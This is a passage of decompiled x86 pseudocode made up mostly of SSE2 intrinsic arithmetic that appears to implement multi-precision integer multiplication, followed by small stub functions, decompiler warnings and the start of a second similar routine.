  __m128i v293; // [esp+1F0h] [ebp-12Ch]
  __int128 v294[7]; // [esp+210h] [ebp-10Ch]
  __m128i v295; // [esp+280h] [ebp-9Ch] BYREF
  __m128i v296; // [esp+290h] [ebp-8Ch] BYREF
  __m128i v297; // [esp+2A0h] [ebp-7Ch] BYREF
  __m128i v298; // [esp+2B0h] [ebp-6Ch] BYREF
  __m128i v299; // [esp+2C0h] [ebp-5Ch] BYREF
  __m128i v300; // [esp+2D0h] [ebp-4Ch] BYREF
  __m128i v301; // [esp+2E0h] [ebp-3Ch] BYREF
  __m128i v302; // [esp+2F0h] [ebp-2Ch] BYREF
  __m128i v303; // [esp+300h] [ebp-1Ch] BYREF
  int v304; // [esp+310h] [ebp-Ch] BYREF

  v276[0] = &v304;
  for ( i = 0; i != 128; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)&v276[i / 2 + 5] = v4;
    *(__m128i *)&v276[i / 2 + 9] = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v285 + 2 * i) = v5;
    v286[i / 8] = _mm_srli_epi64(v5, 0x20u);
    v294[i / 8] = (__int128)v6;
    v294[i / 8 + 1] = (__int128)_mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v295);
  v8 = _mm_mul_epu32(_mm_load_si128(&v277), v7);
  v9 = _mm_mul_epu32(v7, v287);
  si128 = _mm_load_si128(&stru_46C990);
  v11 = _mm_add_epi32((__m128i)0i64, _mm_and_si128(si128, v8));
  v12 = _mm_add_epi32(
          _mm_slli_epi64(
            _mm_add_epi32(
              _mm_add_epi32(
                _mm_add_epi32(
                  _mm_add_epi32(
                    _mm_add_epi32(
                      _mm_add_epi32(
                        _mm_add_epi32(
                          _mm_add_epi32(
                            _mm_add_epi32(
                              _mm_add_epi32(
                                _mm_add_epi32(
                                  _mm_add_epi32(
                                    _mm_add_epi32(
                                      _mm_add_epi32(
                                        _mm_add_epi32(
                                          (__m128i)0i64,
                                          _mm_srli_epi64(
                                            _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[135]), v293),
                                            0x30u)),
                                        _mm_srli_epi64(
                                          _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v302.m128i_i8[8]), v285),
                                          0x30u)),
                                      _mm_srli_epi64(
                                        _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[139]), v292),
                                        0x30u)),
                                    _mm_srli_epi64(
                                      _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v301.m128i_i8[8]), v286[0]),
                                      0x30u)),
                                  _mm_srli_epi64(
                                    _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[143]), v291),
                                    0x30u)),
                                _mm_srli_epi64(
                                  _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v300.m128i_i8[8]), v286[1]),
                                  0x30u)),
                              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[147]), v290), 0x30u)),
                            _mm_srli_epi64(
                              _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v299.m128i_i8[8]), v286[2]),
                              0x30u)),
                          _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[151]), v289), 0x30u)),
                        _mm_srli_epi64(
                          _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v298.m128i_i8[8]), v286[3]),
                          0x30u)),
                      _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[155]), v288), 0x30u)),
                    _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v297.m128i_i8[8]), v286[4]), 0x30u)),
                  _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v276[159]), v287), 0x30u)),
                _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v296.m128i_i8[8]), v286[5]), 0x30u)),
              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v295.m128i_i8[8]), v286[6]), 0x30u)),
            0x20u),
          _mm_srli_epi32(v8, 0x10u));
  v13 = _mm_and_si128(si128, v9);
  v14 = _mm_srli_epi32(v9, 0x10u);
  sub_417F77();
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(v12, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  *(_DWORD *)v19 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), _mm_move_epi64(v18));
  v21 = _mm_unpackhi_epi64(v18, v15);
  *(_QWORD *)(v19 + 2) = v20.m128i_i64[0];
  v22 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v23 = _mm_load_si128(&v296);
  v24 = _mm_mul_epu32(_mm_load_si128(&v277), v23);
  v26 = _mm_mul_epu32(v23, *v25);
  v27 = _mm_load_si128(&stru_46C990);
  v28 = _mm_add_epi32(v22, _mm_and_si128(v27, v24));
  v29 = _mm_add_epi32(v21, _mm_srli_epi32(v24, 0x10u));
  v30 = _mm_and_si128(v27, v26);
  v31 = _mm_srli_epi32(v26, 0x10u);
  v32 = sub_417FB7();
  v34 = _mm_move_epi64(v30);
  v35 = _mm_move_epi64(v31);
  v36 = _mm_add_epi32(
          _mm_add_epi32(
            v28,
            _mm_srli_epi32(
              _mm_cmpgt_epi32(
                _mm_srli_epi32(_mm_cvtsi32_si128(*(_DWORD *)(v33 + 4)), 0x10u),
                _mm_cvtsi32_si128(HIWORD(v32))),
              0x1Fu)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v30, v34), v34), 4));
  v37 = _mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v31, v35), v35), 4));
  *(_DWORD *)v33 = _mm_cvtsi128_si32(v36);
  v38 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v36), 0x10u), _mm_move_epi64(v37));
  v39 = _mm_unpackhi_epi64(v37, v34);
  *(_QWORD *)(v33 + 2) = v38.m128i_i64[0];
  v40 = _mm_add_epi32(_mm_unpackhi_epi64(v36, v34), _mm_srli_epi64(v38, 0x30u));
  v42 = _mm_load_si128(&v296);
  v43 = _mm_mul_epu32(_mm_load_si128(&v278), v42);
  v44 = _mm_mul_epu32(v42, v41[1]);
  v45 = _mm_load_si128(&stru_46C990);
  v46 = _mm_add_epi32(v40, _mm_and_si128(v45, v43));
  v47 = _mm_add_epi32(v39, _mm_srli_epi32(v43, 0x10u));
  v48 = _mm_and_si128(v45, v44);
  v49 = _mm_srli_epi32(v44, 0x10u);
  sub_417FF4();
  v50 = _mm_move_epi64(v48);
  v51 = _mm_move_epi64(v49);
  v52 = _mm_add_epi32(v46, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v48, v50), v50), 4));
  v53 = _mm_add_epi32(v47, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v51), v51), 4));
  *(_DWORD *)(v54 + 8) = _mm_cvtsi128_si32(v52);
  v55 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v52), 0x10u), _mm_move_epi64(v53));
  v56 = _mm_unpackhi_epi64(v53, v50);
  *(_QWORD *)(v54 + 10) = v55.m128i_i64[0];
  v57 = _mm_add_epi32(_mm_unpackhi_epi64(v52, v50), _mm_srli_epi64(v55, 0x30u));
  v58 = _mm_load_si128(&v297);
  v59 = _mm_mul_epu32(_mm_load_si128(&v278), v58);
  v61 = _mm_mul_epu32(v58, *v60);
  v62 = _mm_load_si128(&stru_46C990);
  v63 = _mm_add_epi32(v57, _mm_and_si128(v62, v59));
  v64 = _mm_add_epi32(v56, _mm_srli_epi32(v59, 0x10u));
  v65 = _mm_and_si128(v62, v61);
  v66 = _mm_srli_epi32(v61, 0x10u);
  sub_418031();
  v67 = _mm_move_epi64(v65);
  v68 = _mm_move_epi64(v66);
  v69 = _mm_add_epi32(v63, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v65, v67), v67), 4));
  v70 = _mm_add_epi32(v64, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v66, v68), v68), 4));
  *(_DWORD *)(v71 + 16) = _mm_cvtsi128_si32(v69);
  v72 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v69), 0x10u), _mm_move_epi64(v70));
  v73 = _mm_unpackhi_epi64(v70, v67);
  *(_QWORD *)(v71 + 18) = v72.m128i_i64[0];
  v74 = _mm_add_epi32(_mm_unpackhi_epi64(v69, v67), _mm_srli_epi64(v72, 0x30u));
  v76 = _mm_load_si128(&v297);
  v77 = _mm_mul_epu32(_mm_load_si128(&v279), v76);
  v78 = _mm_mul_epu32(v76, v75[1]);
  v79 = _mm_load_si128(&stru_46C990);
  v80 = _mm_add_epi32(v74, _mm_and_si128(v79, v77));
  v81 = _mm_add_epi32(v73, _mm_srli_epi32(v77, 0x10u));
  v82 = _mm_and_si128(v79, v78);
  v83 = _mm_srli_epi32(v78, 0x10u);
  sub_41806E();
  v84 = _mm_move_epi64(v82);
  v85 = _mm_move_epi64(v83);
  v86 = _mm_add_epi32(v80, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v82, v84), v84), 4));
  v87 = _mm_add_epi32(v81, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v83, v85), v85), 4));
  *(_DWORD *)(v88 + 24) = _mm_cvtsi128_si32(v86);
  v89 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v86), 0x10u), _mm_move_epi64(v87));
  v90 = _mm_unpackhi_epi64(v87, v84);
  *(_QWORD *)(v88 + 26) = v89.m128i_i64[0];
  v91 = _mm_add_epi32(_mm_unpackhi_epi64(v86, v84), _mm_srli_epi64(v89, 0x30u));
  v92 = _mm_load_si128(&v298);
  v93 = _mm_mul_epu32(_mm_load_si128(&v279), v92);
  v95 = _mm_mul_epu32(v92, *v94);
  v96 = _mm_load_si128(&stru_46C990);
  v97 = _mm_add_epi32(v91, _mm_and_si128(v96, v93));
  v98 = _mm_add_epi32(v90, _mm_srli_epi32(v93, 0x10u));
  v99 = _mm_and_si128(v96, v95);
  v100 = _mm_srli_epi32(v95, 0x10u);
  sub_4180AB();
  v101 = _mm_move_epi64(v99);
  v102 = _mm_move_epi64(v100);
  v103 = _mm_add_epi32(v97, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v99, v101), v101), 4));
  v104 = _mm_add_epi32(v98, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v100, v102), v102), 4));
  *(_DWORD *)(v105 + 32) = _mm_cvtsi128_si32(v103);
  v106 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v103), 0x10u), _mm_move_epi64(v104));
  v107 = _mm_unpackhi_epi64(v104, v101);
  *(_QWORD *)(v105 + 34) = v106.m128i_i64[0];
  v108 = _mm_add_epi32(_mm_unpackhi_epi64(v103, v101), _mm_srli_epi64(v106, 0x30u));
  v110 = _mm_load_si128(&v298);
  v111 = _mm_mul_epu32(_mm_load_si128(&v280), v110);
  v112 = _mm_mul_epu32(v110, v109[1]);
  v113 = _mm_load_si128(&stru_46C990);
  v114 = _mm_add_epi32(v108, _mm_and_si128(v113, v111));
  v115 = _mm_add_epi32(v107, _mm_srli_epi32(v111, 0x10u));
  v116 = _mm_and_si128(v113, v112);
  v117 = _mm_srli_epi32(v112, 0x10u);
  sub_4180E8();
  v118 = _mm_move_epi64(v116);
  v119 = _mm_move_epi64(v117);
  v120 = _mm_add_epi32(v114, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v116, v118), v118), 4));
  v121 = _mm_add_epi32(v115, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v117, v119), v119), 4));
  *(_DWORD *)(v122 + 40) = _mm_cvtsi128_si32(v120);
  v123 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v120), 0x10u), _mm_move_epi64(v121));
  v124 = _mm_unpackhi_epi64(v121, v118);
  *(_QWORD *)(v122 + 42) = v123.m128i_i64[0];
  v125 = _mm_add_epi32(_mm_unpackhi_epi64(v120, v118), _mm_srli_epi64(v123, 0x30u));
  v126 = _mm_load_si128(&v299);
  v127 = _mm_mul_epu32(_mm_load_si128(&v280), v126);
  v129 = _mm_mul_epu32(v126, *v128);
  v130 = _mm_load_si128(&stru_46C990);
  v131 = _mm_add_epi32(v125, _mm_and_si128(v130, v127));
  v132 = _mm_add_epi32(v124, _mm_srli_epi32(v127, 0x10u));
  v133 = _mm_and_si128(v130, v129);
  v134 = _mm_srli_epi32(v129, 0x10u);
  sub_418125();
  v135 = _mm_move_epi64(v133);
  v136 = _mm_move_epi64(v134);
  v137 = _mm_add_epi32(v131, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v133, v135), v135), 4));
  v138 = _mm_add_epi32(v132, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v134, v136), v136), 4));
  *(_DWORD *)(v139 + 48) = _mm_cvtsi128_si32(v137);
  v140 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v137), 0x10u), _mm_move_epi64(v138));
  v141 = _mm_unpackhi_epi64(v138, v135);
  *(_QWORD *)(v139 + 50) = v140.m128i_i64[0];
  v142 = _mm_add_epi32(_mm_unpackhi_epi64(v137, v135), _mm_srli_epi64(v140, 0x30u));
  v144 = _mm_load_si128(&v299);
  v145 = _mm_mul_epu32(_mm_load_si128(&v281), v144);
  v146 = _mm_mul_epu32(v144, v143[1]);
  v147 = _mm_load_si128(&stru_46C990);
  v148 = _mm_add_epi32(v142, _mm_and_si128(v147, v145));
  v149 = _mm_add_epi32(v141, _mm_srli_epi32(v145, 0x10u));
  v150 = _mm_and_si128(v147, v146);
  v151 = _mm_srli_epi32(v146, 0x10u);
  sub_418162();
  v152 = _mm_move_epi64(v150);
  v153 = _mm_move_epi64(v151);
  v154 = _mm_add_epi32(v148, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v150, v152), v152), 4));
  v155 = _mm_add_epi32(v149, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v151, v153), v153), 4));
  *(_DWORD *)(v156 + 56) = _mm_cvtsi128_si32(v154);
  v157 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v154), 0x10u), _mm_move_epi64(v155));
  v158 = _mm_unpackhi_epi64(v155, v152);
  *(_QWORD *)(v156 + 58) = v157.m128i_i64[0];
  v159 = _mm_add_epi32(_mm_unpackhi_epi64(v154, v152), _mm_srli_epi64(v157, 0x30u));
  v160 = _mm_load_si128(&v300);
  v161 = _mm_mul_epu32(_mm_load_si128(&v281), v160);
  v163 = _mm_mul_epu32(v160, *v162);
  v164 = _mm_load_si128(&stru_46C990);
  v165 = _mm_add_epi32(v159, _mm_and_si128(v164, v161));
  v166 = _mm_add_epi32(v158, _mm_srli_epi32(v161, 0x10u));
  v167 = _mm_and_si128(v164, v163);
  v168 = _mm_srli_epi32(v163, 0x10u);
  sub_41819F();
  v169 = _mm_move_epi64(v167);
  v170 = _mm_move_epi64(v168);
  v171 = _mm_add_epi32(v165, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v167, v169), v169), 4));
  v172 = _mm_add_epi32(v166, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v168, v170), v170), 4));
  *(_DWORD *)(v173 + 64) = _mm_cvtsi128_si32(v171);
  v174 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v171), 0x10u), _mm_move_epi64(v172));
  v175 = _mm_unpackhi_epi64(v172, v169);
  *(_QWORD *)(v173 + 66) = v174.m128i_i64[0];
  v176 = _mm_add_epi32(_mm_unpackhi_epi64(v171, v169), _mm_srli_epi64(v174, 0x30u));
  v178 = _mm_load_si128(&v300);
  v179 = _mm_mul_epu32(_mm_load_si128(&v282), v178);
  v180 = _mm_mul_epu32(v178, v177[1]);
  v181 = _mm_load_si128(&stru_46C990);
  v182 = _mm_add_epi32(v176, _mm_and_si128(v181, v179));
  v183 = _mm_add_epi32(v175, _mm_srli_epi32(v179, 0x10u));
  v184 = _mm_and_si128(v181, v180);
  v185 = _mm_srli_epi32(v180, 0x10u);
  sub_4181DC();
  v186 = _mm_move_epi64(v184);
  v187 = _mm_move_epi64(v185);
  v188 = _mm_add_epi32(v182, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v184, v186), v186), 4));
  v189 = _mm_add_epi32(v183, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v185, v187), v187), 4));
  *(_DWORD *)(v190 + 72) = _mm_cvtsi128_si32(v188);
  v191 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v188), 0x10u), _mm_move_epi64(v189));
  v192 = _mm_unpackhi_epi64(v189, v186);
  *(_QWORD *)(v190 + 74) = v191.m128i_i64[0];
  v193 = _mm_add_epi32(_mm_unpackhi_epi64(v188, v186), _mm_srli_epi64(v191, 0x30u));
  v194 = _mm_load_si128(&v301);
  v195 = _mm_mul_epu32(_mm_load_si128(&v282), v194);
  v197 = _mm_mul_epu32(v194, *v196);
  v198 = _mm_load_si128(&stru_46C990);
  v199 = _mm_add_epi32(v193, _mm_and_si128(v198, v195));
  v200 = _mm_add_epi32(v192, _mm_srli_epi32(v195, 0x10u));
  v201 = _mm_and_si128(v198, v197);
  v202 = _mm_srli_epi32(v197, 0x10u);
  sub_418219();
  v203 = _mm_move_epi64(v201);
  v204 = _mm_move_epi64(v202);
  v205 = _mm_add_epi32(v199, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v201, v203), v203), 4));
  v206 = _mm_add_epi32(v200, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v202, v204), v204), 4));
  *(_DWORD *)(v207 + 80) = _mm_cvtsi128_si32(v205);
  v208 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v205), 0x10u), _mm_move_epi64(v206));
  v209 = _mm_unpackhi_epi64(v206, v203);
  *(_QWORD *)(v207 + 82) = v208.m128i_i64[0];
  v210 = _mm_add_epi32(_mm_unpackhi_epi64(v205, v203), _mm_srli_epi64(v208, 0x30u));
  v212 = _mm_load_si128(&v301);
  v213 = _mm_mul_epu32(_mm_load_si128(&v283), v212);
  v214 = _mm_mul_epu32(v212, v211[1]);
  v215 = _mm_load_si128(&stru_46C990);
  v216 = _mm_add_epi32(v210, _mm_and_si128(v215, v213));
  v217 = _mm_add_epi32(v209, _mm_srli_epi32(v213, 0x10u));
  v218 = _mm_and_si128(v215, v214);
  v219 = _mm_srli_epi32(v214, 0x10u);
  sub_418256();
  v220 = _mm_move_epi64(v218);
  v221 = _mm_move_epi64(v219);
  v222 = _mm_add_epi32(v216, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v218, v220), v220), 4));
  v223 = _mm_add_epi32(v217, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v219, v221), v221), 4));
  *(_DWORD *)(v224 + 88) = _mm_cvtsi128_si32(v222);
  v225 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v222), 0x10u), _mm_move_epi64(v223));
  v226 = _mm_unpackhi_epi64(v223, v220);
  *(_QWORD *)(v224 + 90) = v225.m128i_i64[0];
  v227 = _mm_add_epi32(_mm_unpackhi_epi64(v222, v220), _mm_srli_epi64(v225, 0x30u));
  v228 = _mm_load_si128(&v302);
  v229 = _mm_mul_epu32(_mm_load_si128(&v283), v228);
  v231 = _mm_mul_epu32(v228, *v230);
  v232 = _mm_load_si128(&stru_46C990);
  v233 = _mm_add_epi32(v227, _mm_and_si128(v232, v229));
  v234 = _mm_add_epi32(v226, _mm_srli_epi32(v229, 0x10u));
  v235 = _mm_and_si128(v232, v231);
  v236 = _mm_srli_epi32(v231, 0x10u);
  sub_418293();
  v237 = _mm_move_epi64(v235);
  v238 = _mm_move_epi64(v236);
  v239 = _mm_add_epi32(v233, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v235, v237), v237), 4));
  v240 = _mm_add_epi32(v234, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v236, v238), v238), 4));
  *(_DWORD *)(v241 + 96) = _mm_cvtsi128_si32(v239);
  v242 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v239), 0x10u), _mm_move_epi64(v240));
  v243 = _mm_unpackhi_epi64(v240, v237);
  *(_QWORD *)(v241 + 98) = v242.m128i_i64[0];
  v244 = _mm_add_epi32(_mm_unpackhi_epi64(v239, v237), _mm_srli_epi64(v242, 0x30u));
  v246 = _mm_load_si128(&v302);
  v247 = _mm_mul_epu32(_mm_load_si128(&v284), v246);
  v248 = _mm_mul_epu32(v246, v245[1]);
  v249 = _mm_load_si128(&stru_46C990);
  v250 = _mm_add_epi32(v244, _mm_and_si128(v249, v247));
  v251 = _mm_add_epi32(v243, _mm_srli_epi32(v247, 0x10u));
  v252 = _mm_and_si128(v249, v248);
  v253 = _mm_srli_epi32(v248, 0x10u);
  sub_4182D0((int)&v284, &v302);
  v254 = _mm_move_epi64(v252);
  v255 = _mm_move_epi64(v253);
  v256 = _mm_add_epi32(v250, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v252, v254), v254), 4));
  v257 = _mm_add_epi32(v251, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v253, v255), v255), 4));
  *(_DWORD *)(v258 + 104) = _mm_cvtsi128_si32(v256);
  v259 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v256), 0x10u), _mm_move_epi64(v257));
  v260 = _mm_unpackhi_epi64(v257, v254);
  *(_QWORD *)(v258 + 106) = v259.m128i_i64[0];
  v261 = _mm_add_epi32(_mm_unpackhi_epi64(v256, v254), _mm_srli_epi64(v259, 0x30u));
  v262 = _mm_load_si128(&v303);
  v263 = _mm_mul_epu32(_mm_load_si128(&v284), v262);
  v265 = _mm_mul_epu32(v262, *v264);
  v266 = _mm_load_si128(&stru_46C990);
  v267 = _mm_and_si128(v266, v263);
  v268 = _mm_add_epi32(v260, _mm_srli_epi32(v263, 0x10u));
  v269 = _mm_and_si128(v266, v265);
  v270 = _mm_srli_epi32(v265, 0x10u);
  v271 = _mm_move_epi64(v269);
  v272 = _mm_move_epi64(v270);
  v273 = _mm_add_epi32(
           _mm_add_epi32(v261, v267),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v269, v271), v271), 4));
  v274 = _mm_add_epi32(v268, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v270, v272), v272), 4));
  *(_DWORD *)(v258 + 112) = _mm_cvtsi128_si32(v273);
  v275 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v273), 0x10u), _mm_move_epi64(v274));
  *(_QWORD *)(v258 + 114) = v275.m128i_i64[0];
  *(_QWORD *)(v258 + 120) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v273, v271), _mm_srli_epi64(v275, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v274, v271), 0x10u)).m128i_u64[0];
}
// 418382: variable 'v19' is possibly undefined
// 4183B8: variable 'v25' is possibly undefined
// 4183E6: variable 'v33' is possibly undefined
// 418455: variable 'v41' is possibly undefined
// 4184C1: variable 'v54' is possibly undefined
// 4184F8: variable 'v60' is possibly undefined
// 418551: variable 'v71' is possibly undefined
// 418578: variable 'v75' is possibly undefined
// 4185E4: variable 'v88' is possibly undefined
// 41861B: variable 'v94' is possibly undefined
// 418674: variable 'v105' is possibly undefined
// 41869B: variable 'v109' is possibly undefined
// 418707: variable 'v122' is possibly undefined
// 41873E: variable 'v128' is possibly undefined
// 418797: variable 'v139' is possibly undefined
// 4187BE: variable 'v143' is possibly undefined
// 41882A: variable 'v156' is possibly undefined
// 418861: variable 'v162' is possibly undefined
// 4188BA: variable 'v173' is possibly undefined
// 4188E1: variable 'v177' is possibly undefined
// 41894D: variable 'v190' is possibly undefined
// 418984: variable 'v196' is possibly undefined
// 4189DD: variable 'v207' is possibly undefined
// 418A04: variable 'v211' is possibly undefined
// 418A70: variable 'v224' is possibly undefined
// 418AA7: variable 'v230' is possibly undefined
// 418B00: variable 'v241' is possibly undefined
// 418B27: variable 'v245' is possibly undefined
// 418B93: variable 'v258' is possibly undefined
// 418BC8: variable 'v264' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;

//----- (00417F77) --------------------------------------------------------
int sub_417F77()
{
  return sub_417FB7();
}
// 417FB7: using guessed type int sub_417FB7(void);

//----- (00417FB7) --------------------------------------------------------
int sub_417FB7()
{
  return sub_417FF4();
}
// 417FF4: using guessed type int sub_417FF4(void);

//----- (00417FF4) --------------------------------------------------------
int sub_417FF4()
{
  return sub_418031();
}
// 418031: using guessed type int sub_418031(void);

//----- (00418031) --------------------------------------------------------
int sub_418031()
{
  return sub_41806E();
}
// 41806E: using guessed type int sub_41806E(void);

//----- (0041806E) --------------------------------------------------------
int sub_41806E()
{
  return sub_4180AB();
}
// 4180AB: using guessed type int sub_4180AB(void);

//----- (004180AB) --------------------------------------------------------
int sub_4180AB()
{
  return sub_4180E8();
}
// 4180E8: using guessed type int sub_4180E8(void);

//----- (004180E8) --------------------------------------------------------
int sub_4180E8()
{
  return sub_418125();
}
// 418125: using guessed type int sub_418125(void);

//----- (00418125) --------------------------------------------------------
int sub_418125()
{
  return sub_418162();
}
// 418162: using guessed type int sub_418162(void);

//----- (00418162) --------------------------------------------------------
int sub_418162()
{
  return sub_41819F();
}
// 41819F: using guessed type int sub_41819F(void);

//----- (0041819F) --------------------------------------------------------
int sub_41819F()
{
  return sub_4181DC();
}
// 4181DC: using guessed type int sub_4181DC(void);

//----- (004181DC) --------------------------------------------------------
int sub_4181DC()
{
  return sub_418219();
}
// 418219: using guessed type int sub_418219(void);

//----- (00418219) --------------------------------------------------------
int sub_418219()
{
  return sub_418256();
}
// 418256: using guessed type int sub_418256(void);

//----- (00418256) --------------------------------------------------------
int sub_418256()
{
  return sub_418293();
}
// 418293: using guessed type int sub_418293(void);

//----- (00418293) --------------------------------------------------------
int sub_418293()
{
  return sub_4182D0();
}
// 4182D0: using guessed type int sub_4182D0(void);

//----- (004182D0) --------------------------------------------------------
__m128i __usercall sub_4182D0@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00418C54) --------------------------------------------------------
void __cdecl sub_418C54(int a1, int a2, int a3)
{
  int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm0
  __m128i v9; // xmm7
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm5
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  int v19; // ecx
  __m128i v20; // xmm6
  __m128i v21; // xmm5
  __m128i v22; // xmm4
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i *v25; // edx
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm4
  __m128i v29; // xmm5
  __m128i v30; // xmm6
  __m128i v31; // xmm7
  unsigned int v32; // eax
  int v33; // ecx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  __m128i v36; // xmm4
  __m128i v37; // xmm5
  __m128i v38; // xmm6
  __m128i v39; // xmm5
  __m128i v40; // xmm4
  __m128i *v41; // edx
  __m128i v42; // xmm7
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm6
  __m128i v49; // xmm7
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  int v54; // ecx
  __m128i v55; // xmm6
  __m128i v56; // xmm5
  __m128i v57; // xmm4
  __m128i v58; // xmm7
  __m128i v59; // xmm0
  __m128i *v60; // edx
  __m128i v61; // xmm7
  __m128i v62; // xmm6
  __m128i v63; // xmm2
  __m128i v64; // xmm5
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm4
  __m128i v70; // xmm5
  __m128i v71; // xmm6
  _DWORD v72[13]; // [esp-4h] [ebp-E0h] BYREF
  __m128i v73; // [esp+30h] [ebp-ACh] BYREF
  __m128i v74; // [esp+40h] [ebp-9Ch] BYREF
  __m128i v75; // [esp+50h] [ebp-8Ch]
  __m128i v76; // [esp+60h] [ebp-7Ch]
  __m128i v77; // [esp+70h] [ebp-6Ch]
  __int128 v78; // [esp+90h] [ebp-4Ch]
  __m128i v79; // [esp+A0h] [ebp-3Ch] BYREF
  __m128i v80; // [esp+B0h] [ebp-2Ch] BYREF
  __m128i v81; // [esp+C0h] [ebp-1Ch] BYREF
  int v82; // [esp+D0h] [ebp-Ch] BYREF

  v72[0] = &v82;
  for ( i = 0; i != 16; i += 8 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i * 2), 216);
